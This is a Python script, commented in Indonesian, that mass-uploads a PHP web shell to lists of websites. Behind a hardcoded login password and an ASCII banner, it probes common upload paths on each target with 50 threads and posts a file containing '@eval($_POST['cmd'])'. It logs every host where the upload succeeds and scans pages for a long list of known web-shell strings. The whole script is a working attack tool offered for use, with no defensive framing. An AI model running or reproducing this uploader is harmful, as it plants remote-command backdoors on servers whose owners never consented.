# Menampilkan gambar ASCII (tengkorak Ghost Rider)
def print_ghost_rider():
    print("""
░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓████████▓▒░      ░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░    ░▒▓██▓▒░       ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░  ░▒▓██▓▒░         ░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░  ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓██▓▒░           ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓████████▓▒░      ░▒▓███████▓▒░░▒▓████████▓▒░  ░▒▓██▓▒░  ░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                                                                                                         
                                                                                                                                                                         
# -*-coding:Latin-1 -*- 
""")

# Fungsi untuk login dengan password
def login():
    print("Login required!")
    password = "fariz123"  # Tentukan password yang benar disini
    user_password = input("Enter password: ")
    
    if user_password != password:
        print("Incorrect password! Exiting program.")
        exit()
    else:
        # Menampilkan gambar ASCII setelah login berhasil
        print_ghost_rider()

# Memasukkan proses login
login()

# Mengimpor pustaka yang diperlukan
import sys
import requests
import re
from multiprocessing.dummy import Pool
from colorama import Fore, init
import base64

init(autoreset=True)

# Warna untuk output terminal
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA

# Mematikan peringatan SSL
requests.packages.urllib3.disable_warnings()

# Menambahkan header HTTP standar
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'Referer': 'https://www.google.com'
}

# Memastikan target ada di inputan
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = sys.argv[0].split('\\')
    exit(f'\n  [!] Masukkan file <{path[-1]}> <sites.txt>')

# Fungsi untuk menghapus bagian http:// atau https:// dari URL
def URLdomain(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    
    pattern = re.compile('(.*)/')
    while re.findall(pattern, site):
        site = re.findall(pattern, site)[0]
    return site

# Fungsi untuk mendeteksi shell PHP dengan pattern yang sudah ditambahkan
def lolers(url):
    # Daftar path yang digunakan untuk upload shell
    upload_paths = [
        '/upload.php', '/admin/upload.php', '/file_upload.php', '/upload_shell.php', 
        '/admin/files/upload.php', '/file_manager/upload.php', '/shell_upload.php', 
        '/user/upload.php', '/uploads/', '/wp-content/uploads/', '/wp-admin/images/',
        '/upload/image/lo.php',  # Tambahan sesuai dengan path sebelumnya
        '/upload/images/upload.php',  # Menggunakan path umum lainnya
    ]

    # Daftar indikasi raw PHP shell
    shell_indicators = [
        '<?php @eval($_POST[\'cmd\']); ?>', '<?php $cmd=$_POST[\'cmd\']; echo shell_exec($cmd); ?>',
        '<?php echo shell_exec($_GET[\'cmd\']); ?>', '<?php system($_POST[\'cmd\']); ?>',
        '<?php passthru($_GET[\'cmd\']); ?>', '<?php $cmd=$_GET[\'cmd\'];echo shell_exec($cmd); ?>',
        '<?php $cmd=$_POST[\'cmd\'];echo shell_exec($cmd); ?>', '<?php echo exec($_POST[\'cmd\']); ?>',
        '<?php echo shell_exec($_REQUEST[\'cmd\']); ?>', '<?php eval(base64_decode($_POST[\'cmd\'])); ?>',
        '<?php file_put_contents(\'shell.php\', "<?php @eval($_POST[\'cmd\']); ?>"); ?>',
        '<?php if(isset($_POST[\'cmd\'])) { echo shell_exec($_POST[\'cmd\']); } ?>',
        '<?php if(isset($_GET[\'cmd\'])) { echo shell_exec($_GET[\'cmd\']); } ?>',
        '<?php @eval(base64_decode($_GET[\'cmd\'])); ?>', '<?php @system($_POST[\'cmd\']); ?>',
        '<?php @passthru($_GET[\'cmd\']); ?>', '<?php $cmd=$_GET[\'cmd\']; echo shell_exec($cmd); ?>',
        '<?php $cmd=$_POST[\'cmd\']; echo system($cmd); ?>', '<?php if(isset($_FILES[\'shell\'])) { move_uploaded_file($_FILES[\'shell\'][\'tmp_name\'], $_FILES[\'shell\'][\'name\']); } ?>',
        '<?php if($_FILES[\'file\']) { move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], "/uploads/shell.php"); } ?>',
        '<?php @eval($_GET[\'cmd\']); ?>', '<?php $file = $_FILES[\'file\']; move_uploaded_file($file[\'tmp_name\'], "uploads/".$file[\'name\']); ?>',
        '$_FILES[\'file\']', '$_FILES[\'shell\']', '$_FILES[\'cmd\']', '$_FILES[\'file\'][\'tmp_name\']',
        '<?php system("id"); ?>', '<?php exec("ls -al"); ?>', '<?php @passthru("ls"); ?>',
        'eval($_GET[\'cmd\']);', 'chmod("shell.php", 0777);', '<?php system("id"); ?>',
        '<?php exec("ls -al"); ?>', '<?php @passthru("ls"); ?>'
    ]

    try:
        url = 'http://' + URLdomain(url)

        # Mengecek apakah URL tersebut mengandung "lo.php"
        if "lo.php" in url:
            # Cek apakah URL memiliki query parameter dengan base64 encoding
            match = re.search(r'\?d=([A-Za-z0-9+/=]+)', url)
            if match:
                decoded_path = base64.b64decode(match.group(1)).decode('utf-8')
                print(f' -| {url} --> {fg}[Found Base64 Encoded Path: {decoded_path}]')

                # Coba mengakses URL dengan base64 decoded path
                check_url = f'{url}?d={match.group(1)}'
                check = requests.get(check_url, headers=headers, allow_redirects=True, verify=False, timeout=15)

                page_content = check.content.decode('latin-1')
                if any(indicator in page_content for indicator in shell_indicators):
                    print(f' -| {check_url} --> {fg}[Successfully - Found Shell Indicator]')  # Jika ditemukan indikator shell
                    with open('shells.txt', 'a') as f:
                        f.write(check_url + '\n')
                else:
                    print(f' -| {check_url} --> {fr}[Failed]')  # Gagal menemukan indikasi shell

        # Upload shell PHP secara massal
        php_shell_payload = """<?php
            @eval($_POST['cmd']);
        ?>"""
        
        for path in upload_paths:
            target_url = url + path

            # Cek apakah path tersebut dapat diakses (kemungkinan rentan)
            check = requests.get(target_url, headers=headers, allow_redirects=True, verify=False, timeout=10)
            if check.status_code == 200:
                print(f' -| {target_url} --> {fg}[Rentan]')

                # Persiapkan file shell PHP untuk diupload
                files = {
                    'file': ('shell.php', php_shell_payload, 'application/x-php')
                }

                # Coba untuk upload shell PHP
                response = requests.post(target_url, files=files, headers=headers, timeout=15)

                # Cek apakah shell berhasil diupload
                if response.status_code == 200 and 'upload berhasil' in response.text.lower():
                    print(f' -| {target_url} --> {fg}[Shell Berhasil Diupload]')  # Upload berhasil
                    with open('uploaded_shells.txt', 'a') as f:
                        f.write(target_url + '/shell.php\n')
                else:
                    print(f' -| {target_url} --> {fr}[Gagal Upload Shell]')  # Upload gagal
            else:
                print(f' -| {target_url} --> {fr}[Tidak Rentan]')  # Path tidak rentan
    except Exception as e:
        print(f' -| {url} --> {fr}[Failed] due to: {str(e)}')  # Jika ada kesalahan

# Fungsi untuk menjalankan proses secara massal dengan multiprocessing
def mass_upload(target_list):
    mp = Pool(50)  # Menggunakan 50 thread untuk upload massal
    mp.map(lolers, target_list)
    mp.close()
    mp.join()

# Jalankan fungsi untuk upload shell massal
mass_upload(target)

print(f'\n [!] {fc}Proses Selesai, hasil disimpan di "shells.txt" dan "uploaded_shells.txt".')
